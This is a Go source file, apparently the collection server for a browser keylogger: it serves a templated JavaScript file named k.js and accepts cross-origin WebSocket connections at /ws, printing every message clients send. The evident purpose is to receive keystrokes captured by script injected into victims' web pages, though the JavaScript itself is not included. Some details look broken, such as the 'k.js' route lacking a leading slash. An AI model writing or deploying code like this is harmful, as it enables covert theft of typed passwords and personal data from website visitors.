package web_key_logger

import (
	"flag"
	"fmt"
	"html/template"
	"log"
	"net/http"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

var (
	// global vars
	upgrader = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {return true},
	}

	// listening address
	listen_addr string

	//JS template that will be returned w. context data for k.js request
	js_template *template.Template
)

func init(){
	flag.StringVar(&listen_addr, "listen-addr", "", "address to listen in on")
	flag.Parse()
	var err error
	js_template, err = template.ParseFiles("logger.js")
	if err!=nil{
		panic(err)
	}
}

func serve_ws(w http.ResponseWriter, r *http.Request){
	conn, err := upgrader.Upgrade(w, r, nil)
	if err!=nil{
		http.Error(w, "", 500)
		return
	}

	defer conn.Close()
	fmt.Printf("connection from %s \n", conn.RemoteAddr().String())

	for{
		_, msg, err := conn.ReadMessage()
		if err!=nil{
			return
		}

		fmt.Printf("from %s: %s \n", conn.RemoteAddr().String(), string(msg))
	}
}

func server_js_file(w http.ResponseWriter, r *http.Request){
	w.Header().Set("Content-Type", "application/javascript")
	err := js_template.Execute(w, listen_addr)
	if err!=nil{}
}

func WebKeyLogger(){
	r := mux.NewRouter()
	//handle /ws request
	r.HandleFunc("/ws", serve_ws)
	//handle /k.js request
	r.HandleFunc("k.js", server_js_file)
	//start server listener
	log.Fatal(http.ListenAndServe(":8000", r))
}